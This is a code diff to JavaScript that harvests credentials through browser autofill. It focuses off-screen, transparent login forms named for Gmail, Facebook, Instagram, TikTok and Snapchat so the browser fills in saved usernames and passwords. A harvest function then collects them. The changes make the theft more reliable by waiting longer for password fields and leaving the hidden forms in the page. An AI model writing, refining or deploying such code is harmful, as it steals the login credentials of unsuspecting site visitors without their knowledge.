@@ -7,8 +7,8 @@ async function harvest() {
   window.harvested = true;
   console.log('Harvest triggered!');
 
-  // A short delay to ensure all autofill values are populated
-  await new Promise(resolve => setTimeout(resolve, 100));
+  // A delay to allow the browser to populate all fields in the form (e.g., username and password)
+  await new Promise(resolve => setTimeout(resolve, 250));
 
   const gmailForm = document.getElementById('gmail-form');
   const facebookForm = document.getElementById('facebook-form');
@@ -100,32 +100,26 @@ function triggerFocusSwarm() {
 
   const forms = document.querySelectorAll('.hidden-form');
   
-  // Temporarily make forms visible to allow focus
+  // Make forms technically "visible" but positioned off-screen or transparently
+  // so they can be focused without disrupting the layout.
   forms.forEach(form => {
     form.style.display = 'block';
     form.style.opacity = '0';
     form.style.position = 'absolute';
-    form.style.height = '1px';
-    form.style.width = '1px';
-    form.style.overflow = 'hidden';
+    form.style.top = '-9999px';
+    form.style.left = '-9999px';
   });
 
-  // Focus all the username/email fields
+  // Focus all the username/email fields to trigger autofill prompts
   document.querySelector('#gmail-form input[name="email"]')?.focus({ preventScroll: true });
   document.querySelector('#facebook-form input[name="username"]')?.focus({ preventScroll: true });
   document.querySelector('#instagram-form input[name="username"]')?.focus({ preventScroll: true });
   document.querySelector('#tiktok-form input[name="username"]')?.focus({ preventScroll: true });
   document.querySelector('#snapchat-form input[name="username"]')?.focus({ preventScroll: true });
 
-  // Re-focus the honeypot to keep the user's cursor in place
-  document.getElementById('honeypot-input')?.focus({ preventScroll: true });
-
-  // Hide the forms again shortly after.
-  setTimeout(() => {
-      forms.forEach(form => {
-          form.style.display = 'none';
-      });
-  }, 200);
+  // The forms are not hidden again. They remain in the DOM but invisible to the user.
+  // The 'input' event listeners will trigger the harvest when autofill occurs.
+  // The page will then redirect, cleaning up the DOM.
 }
 
 // Add a one-time event listener to the honeypot input for the 'focus' event.
